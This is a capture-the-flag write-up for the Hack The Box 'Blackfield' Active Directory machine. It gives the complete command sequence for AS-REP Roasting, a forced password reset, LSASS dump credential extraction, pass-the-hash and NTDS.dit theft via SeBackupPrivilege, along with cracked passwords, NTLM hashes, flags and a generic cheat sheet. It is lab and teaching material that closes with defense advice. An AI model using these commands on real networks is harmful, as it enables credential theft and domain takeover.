# HTB - Blackfield - 10.129.229.17

## HTB - Blackfield

### Machine Info

* **Difficulty:** Hard
* **OS:** Windows (Server 2019 Build 17763)
* **IP:** 10.129.229.17
* **Key Skills:** AS-REP Roasting, BloodHound analysis, ForceChangePassword abuse, LSASS memory dump analysis, SeBackupPrivilege exploitation

### Overview

Blackfield is a hard Active Directory box that demonstrates a realistic attack chain through an AD environment. Starting with anonymous SMB access to enumerate usernames, we perform AS-REP Roasting to obtain credentials for the support account. BloodHound reveals ForceChangePassword rights over an audit account, which provides access to a forensic share containing LSASS memory dumps. Extracting credentials from the dump grants access as a backup service account, and finally we abuse SeBackupPrivilege to dump the NTDS.dit database and obtain Domain Admin credentials. This box teaches critical AD enumeration and post-exploitation techniques.

**Key Concepts:**

* SMB anonymous enumeration
* AS-REP Roasting (Kerberos pre-authentication disabled)
* BloodHound Active Directory analysis
* ForceChangePassword ACL abuse
* LSASS memory dump analysis with pypykatz
* SeBackupPrivilege exploitation
* NTDS.dit extraction and hash dumping

**Common Ports:**

* **53/TCP** - DNS
* **88/TCP** - Kerberos
* **389/TCP** - LDAP
* **445/TCP** - SMB
* **5985/TCP** - WinRM

**Domain Information:**

* Domain: BLACKFIELD.local
* Hostname: DC01
* DC: DC01.BLACKFIELD.local

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals AD Domain Controller ├─ SMB anonymous access to profiles$ share ├─ Extract username list from folder names └─ Sync time with DC (required for Kerberos)
2. **AS-REP Roasting** ├─ Test users for disabled pre-authentication ├─ Obtain TGT hash for support user ├─ Crack hash with hashcat └─ Validate credentials: support:#00^BlackKnight
3. **BloodHound Analysis** ├─ Collect domain data ├─ Discover attack path ├─ support has ForceChangePassword on AUDIT2020 └─ Plan privilege escalation
4. **Lateral Movement to AUDIT2020** ├─ Change AUDIT2020 password via RPC ├─ Access forensic share ├─ Download LSASS memory dump └─ Extract credentials with pypykatz
5. **Access as svc\_backup** ├─ Extract svc\_backup NTLM hash from dump ├─ Pass-the-Hash via WinRM ├─ Enumerate privileges └─ Capture user flag
6. **Privilege Escalation** ├─ Identify SeBackupPrivilege ├─ Create shadow copy with DiskShadow ├─ Extract NTDS.dit and SYSTEM hive ├─ Dump hashes with secretsdump └─ Pass-the-Hash as Administrator

***

### Initial Enumeration

#### Port Scanning

```bash
nmap -p- -Pn -sCV -vvv 10.129.229.17 -oN blackfield.tcp
```

**Results:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

**Important:** Clock skew detected (+6h59m59s)

**Sync time with DC:**

```bash
# Check DC time
net time -S 10.129.229.17

# Sync your clock (if needed)
sudo ntpdate 10.129.229.17
```

#### SMB Enumeration

**Test anonymous access:**

```bash
nxc smb 10.129.229.17 -u 'a' -p '' --shares
```

**Output:**

```
SMB  10.129.229.17  445  DC01  [+] BLACKFIELD.local\a: (Guest)
SMB  10.129.229.17  445  DC01  [*] Enumerated shares
     Share           Permissions     Remark
     -----           -----------     ------
     ADMIN$                          Remote Admin
     C$                              Default share
     forensic                        Forensic / Audit share.
     IPC$            READ            Remote IPC
     NETLOGON                        Logon server share
     profiles$       READ
     SYSVOL                          Logon server share
```

**Accessible shares:**

* `profiles$` - READ access (username enumeration)
* `forensic` - No access yet (interesting for later)

#### Username Enumeration

**Access profiles$ share:**

```bash
smbclient -N //10.129.229.17/profiles$
smb: \> ls
```

**Discovered usernames (partial list):**

```
AAlleni
ABarteski
ABekesz
ABenzies
...
support
audit2020
svc_backup
...
```

**Extract usernames to file:**

```bash
smbclient -N //10.129.229.17/profiles$ -c 'ls' | awk '{print $1}' > users.txt
```

***

### AS-REP Roasting

#### Understanding AS-REP Roasting

**What is AS-REP Roasting?**

When a user account has "Do not require Kerberos preauthentication" enabled, anyone can request a TGT for that user. The response contains encrypted data that can be cracked offline.

**Why it works:**

* No authentication needed to request the TGT
* Response encrypted with user's password hash
* Can be cracked offline with hashcat

#### Finding Vulnerable Accounts

**Check all users for disabled pre-authentication:**

```bash
impacket-GetNPUsers BLACKFIELD.local/ -usersfile users.txt -dc-ip 10.129.229.17 -no-pass
```

**Vulnerable account found:**

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:ba1b4ced373995d3bd780989e343b89a$a649fa8da2d95f6b80a4b003c8d795e2c65bba423bc83c16e06bca26998a5266ae75bf2b14531d6e3b35694c86be4933669379b9b980764210d1fc0c1fb88d2f100cf8fdc0f097c2c4dcf9bf8e50df12c6a90b51ebbd503abdc072710477ac9f9f33a863da0a16139f4229d47652d47497c280a7dafe51e8cbb1ad83122af308a79102ee2112f94bddf738d403cf54fd8f3198a1237234dfba143778ae0780c256b0eff8c4712465e5efe2e762bba55c8974dd7462437a40b28bed4b2b04bf08e32e8af442a3c768f6f539f555664ada885b5afcf61421f0dd513123934f27114866e589f8b5a7607e08e0d3e40a3313b7d9eb96
```

#### Cracking the Hash

**Save hash to file:**

```bash
echo '$krb5asrep$23$support@BLACKFIELD.LOCAL:...' > support.hash
```

**Crack with hashcat:**

```bash
hashcat -m 18200 support.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
#00^BlackKnight
```

**Credentials obtained:**

```
support:#00^BlackKnight
```

***

### BloodHound Analysis

#### Data Collection

**Sync time first (required):**

```bash
net time -S 10.129.229.17
```

**Collect domain data:**

```bash
bloodhound-python -c All -d 'BLACKFIELD.local' -u 'support' -p '#00^BlackKnight' -ns 10.129.229.17
```

#### LDAP Enumeration (Alternative)

**Quick check for WinRM access:**

```bash
ldapsearch -x -H ldap://10.129.229.17 -D 'support@BLACKFIELD.local' -w '#00^BlackKnight' \
    -b 'CN=Remote Management Users,CN=Builtin,DC=BLACKFIELD,DC=local' member
```

**Result:**

```
member: CN=svc_backup,CN=Users,DC=BLACKFIELD,DC=local
```

**Note:** Only svc\_backup has WinRM access, not support.

#### Attack Path Discovery

**BloodHound reveals:**

```
support → (ForceChangePassword) → AUDIT2020
```

**What is ForceChangePassword?**

Allows changing a user's password without knowing the current password. The target's password is reset to a value we control.

***

### Lateral Movement - AUDIT2020

#### Changing AUDIT2020 Password

**Use RPC to change password:**

```bash
net rpc password "AUDIT2020" "newP@ssword2022" \
    -U "BLACKFIELD.local"/"support"%"#00^BlackKnight" \
    -S "DC01.BLACKFIELD.local"
```

**Verify the change:**

```bash
nxc smb 10.129.229.17 -u AUDIT2020 -p "newP@ssword2022" --shares
```

**Output:**

```
SMB  10.129.229.17  445  DC01  [+] BLACKFIELD.local\AUDIT2020:newP@ssword2022
```

#### Accessing Forensic Share

**New share access:**

```bash
smbclient //10.129.229.17/forensic -U 'AUDIT2020%newP@ssword2022'
```

**Contents:**

```
smb: \> ls
  commands_output            D        0  Sun Feb 23 13:14:37 2020
  memory_analysis            D        0  Thu May 28 16:28:33 2020
  tools                      D        0  Sun Feb 23 08:39:08 2020
```

**Memory analysis folder:**

```
smb: \memory_analysis\> ls
  conhost.zip               A 37876530  Thu May 28 16:25:36 2020
  ctfmon.zip                A 24962333  Thu May 28 16:25:45 2020
  dfsrs.zip                 A 23993305  Thu May 28 16:25:54 2020
  dllhost.zip               A 18366396  Thu May 28 16:26:04 2020
  ismserv.zip               A  8810157  Thu May 28 16:26:13 2020
  lsass.zip                 A 41936098  Thu May 28 16:25:08 2020  ← Critical!
  mmc.zip                   A 64288607  Thu May 28 16:25:25 2020
  ...
```

#### Downloading LSASS Dump

**LSASS is critical:**

* Local Security Authority Subsystem Service
* Stores authentication credentials in memory
* Contains NTLM hashes, Kerberos tickets, plaintext passwords

**Download:**

```bash
smb: \memory_analysis\> get lsass.zip
```

**Extract:**

```bash
unzip lsass.zip
```

***

### LSASS Dump Analysis

#### Understanding LSASS Memory Dumps

**What is LSASS?**

LSASS (lsass.exe) handles Windows authentication. Memory dumps capture credentials stored in memory at the time of the dump.

**What we can extract:**

* NTLM password hashes
* Kerberos tickets
* Plaintext passwords (if WDigest enabled)
* DPAPI keys

#### Extracting Credentials with pypykatz

**Install pypykatz:**

```bash
pip install pypykatz
```

**Parse the dump:**

```bash
pypykatz lsa minidump lsass.DMP
```

#### Extracted Credentials

**Key accounts found:**

| Username      | NTLM Hash                          |
| ------------- | ---------------------------------- |
| svc\_backup   | `9658d1d1dcd9250115e2205d9f48400d` |
| Administrator | `7f1e4ff8c6a8e6b6fcae2d9c0572cd62` |
| DC01$         | `b624dc83a27cc29da11d9bf25efea796` |

**svc\_backup details:**

```
== LogonSession ==
username svc_backup
domainname BLACKFIELD
== MSV ==
    Username: svc_backup
    Domain: BLACKFIELD
    NT: 9658d1d1dcd9250115e2205d9f48400d
    SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
```

**Note:** The Administrator hash from the dump is old and doesn't work. We need to escalate via svc\_backup.

***

### Access as svc\_backup

#### WinRM Connection

**Pass-the-Hash:**

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

**Success!**

#### User Flag

```powershell
type C:\Users\svc_backup\Desktop\user.txt
```

**Flag:**

```
3920bb317a0bef51027e2852be64b543
```

#### Privilege Enumeration

```powershell
whoami /all
```

**Critical findings:**

**Group memberships:**

```
BUILTIN\Backup Operators    Mandatory group, Enabled
BUILTIN\Remote Management Users
```

**Privileges:**

```
SeBackupPrivilege    Back up files and directories    Enabled
SeRestorePrivilege   Restore files and directories    Enabled
```

***

### Privilege Escalation - SeBackupPrivilege

#### Understanding SeBackupPrivilege

**What is SeBackupPrivilege?**

Allows reading any file on the system, bypassing DACL permissions. Intended for backup software.

**Why it's powerful:**

* Can read NTDS.dit (AD database with all password hashes)
* Can read SYSTEM hive (required for decryption)
* Bypasses file permissions entirely

**Attack plan:**

1. Create shadow copy of C: drive
2. Copy NTDS.dit from shadow copy
3. Extract SYSTEM hive from registry
4. Dump hashes with secretsdump

#### Creating DiskShadow Script

**On Kali, create `backup.dsh`:**

```
set context persistent nowriters
add volume c: alias backup
create
expose %backup% z:
```

**Convert to Windows format:**

```bash
unix2dos backup.dsh
```

**Why unix2dos?**

Windows requires CRLF line endings. Unix uses LF only. The conversion prevents parsing errors.

#### Executing the Attack

**Upload script:**

```powershell
cd C:\Temp
upload backup.dsh
```

**Create shadow copy:**

```powershell
diskshadow /s backup.dsh
```

**Output:**

```
DiskShadow> set context persistent nowriters
DiskShadow> add volume c: alias backup
DiskShadow> create
Alias backup for shadow ID {...} set as environment variable.
Shadow copy set {...} successfully exposed as z:\.
```

#### Extracting NTDS.dit

**Copy NTDS.dit using robocopy:**

```powershell
robocopy /b z:\windows\ntds . ntds.dit
```

**Parameters:**

* `/b` - Backup mode (uses SeBackupPrivilege)
* `z:\windows\ntds` - Source (shadow copy)
* `.` - Destination (current directory)
* `ntds.dit` - File to copy

#### Extracting SYSTEM Hive

**Save from registry:**

```powershell
reg save hklm\system C:\Temp\system
```

#### Downloading Files

**Download both files:**

```powershell
download ntds.dit
download system
```

***

### Dumping Domain Hashes

#### Using secretsdump

**Extract all hashes:**

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
...
```

**Current Administrator hash:**

```
184fb5e5178480be64824d4cd53b99ee
```

***

### Administrator Access

#### Pass-the-Hash

```bash
evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

#### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Flag:**

```
4375a629c7c67c8e29db269060c955cb
```

***

### Quick Reference

#### AS-REP Roasting

```bash
# Check for vulnerable users
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass

# With known user
impacket-GetNPUsers DOMAIN/user -dc-ip DC_IP -no-pass

# Crack hash
hashcat -m 18200 hash.txt wordlist.txt
```

#### ForceChangePassword

```bash
# Change password via RPC
net rpc password "TARGET_USER" "NewPassword123!" \
    -U "DOMAIN"/"USER"%"PASSWORD" -S "DC"

# Alternative with rpcclient
rpcclient -U 'user%password' DC_IP
rpcclient $> setuserinfo2 TARGET_USER 23 'NewPassword123!'
```

#### LSASS Dump Analysis

```bash
# Parse with pypykatz
pypykatz lsa minidump lsass.DMP

# Extract specific info
pypykatz lsa minidump lsass.DMP -o output.txt

# Parse with mimikatz (Windows)
sekurlsa::minidump lsass.dmp
sekurlsa::logonPasswords
```

#### SeBackupPrivilege Exploitation

```powershell
# Create DiskShadow script
set context persistent nowriters
add volume c: alias backup
create
expose %backup% z:

# Execute
diskshadow /s script.dsh

# Copy NTDS.dit
robocopy /b z:\windows\ntds . ntds.dit

# Save SYSTEM hive
reg save hklm\system system

# Dump hashes
impacket-secretsdump -ntds ntds.dit -system system local
```

#### Time Synchronization

```bash
# Check DC time
net time -S DC_IP

# Sync with DC
sudo ntpdate DC_IP

# Alternative
sudo timedatectl set-ntp false
sudo date -s "$(net time -S DC_IP 2>/dev/null | grep 'time' | cut -d' ' -f4-)"
```

***

### Troubleshooting

#### AS-REP Roasting Fails

**Problem:** "Clock skew too great"

**Solution:**

```bash
# Sync time with DC
sudo ntpdate 10.129.229.17

# Verify time
date
```

#### BloodHound Collection Fails

**Problem:** Connection errors or timeout

**Solution:**

```bash
# Sync time first
sudo ntpdate DC_IP

# Use explicit DNS
bloodhound-python -c All -d DOMAIN -u USER -p PASS -ns DC_IP --dns-tcp

# Try specific collectors
bloodhound-python -c DCOnly -d DOMAIN -u USER -p PASS -ns DC_IP
```

#### DiskShadow Script Errors

**Problem:** "Invalid command" or parsing errors

**Solution:**

```bash
# Ensure Windows line endings
unix2dos script.dsh

# Check for trailing spaces
cat -A script.dsh

# Use simple format
echo -e "set context persistent nowriters\r\nadd volume c: alias x\r\ncreate\r\nexpose %x% z:\r\n" > script.dsh
```

#### Robocopy Access Denied

**Problem:** "Access Denied" even with SeBackupPrivilege

**Solution:**

```powershell
# Ensure /b flag is used
robocopy /b source dest file

# Alternative: use wbadmin
wbadmin start backup -backuptarget:\\server\share -include:c:\windows\ntds

# Alternative: copy with backup intent via PowerShell
# Import SeBackupPrivilege module first
Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Temp\ntds.dit
```

#### pypykatz Parse Errors

**Problem:** "Invalid minidump" or parsing failures

**Solution:**

```bash
# Check file integrity
file lsass.DMP

# Try different parser
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords" exit

# Extract with volatility
vol.py -f lsass.DMP windows.hashdump
```

***

### Key Takeaways

**What we learned:**

1. **Anonymous SMB enumeration** - Profile shares often leak valid usernames for further attacks
2. **AS-REP Roasting** - Accounts without Kerberos pre-authentication can have their TGT hashes cracked offline
3. **BloodHound analysis** - Visualizes attack paths through AD permissions that would be hard to find manually
4. **ForceChangePassword abuse** - Users with this permission can reset passwords without knowing the current one
5. **LSASS dump analysis** - Memory dumps contain cached credentials that can be extracted offline
6. **SeBackupPrivilege exploitation** - Members of Backup Operators can read any file, including NTDS.dit
7. **DiskShadow for file access** - Creates shadow copies that can be accessed to bypass locks on system files

**Attack chain summary:** SMB anonymous → Username enumeration → AS-REP Roasting → Support credentials → BloodHound → ForceChangePassword → AUDIT2020 → Forensic share → LSASS dump → svc\_backup hash → SeBackupPrivilege → NTDS.dit dump → Administrator hash → Domain Admin

**Defense recommendations:**

* Disable anonymous SMB access
* Enable Kerberos pre-authentication for all accounts
* Regularly audit ACL permissions with BloodHound
* Restrict ForceChangePassword rights
* Protect forensic data with strong access controls
* Don't store memory dumps on network shares
* Remove unnecessary users from Backup Operators
* Monitor for DiskShadow and shadow copy creation
* Implement Protected Users group for sensitive accounts
* Enable Credential Guard to protect LSASS

***

### Related Topics

* \[\[AS-REP Roasting]]
* \[\[BloodHound Analysis]]
* \[\[ForceChangePassword Abuse]]
* \[\[LSASS Dump Analysis]]
* \[\[SeBackupPrivilege Exploitation]]
* \[\[NTDS.dit Extraction]]
* \[\[Pass-the-Hash]]

***

### Tags

\#active-directory #as-rep-roasting #bloodhound #forcechangepassword #lsass #sebackupprivilege #ntds #privilege-escalation #oscp #crto

***
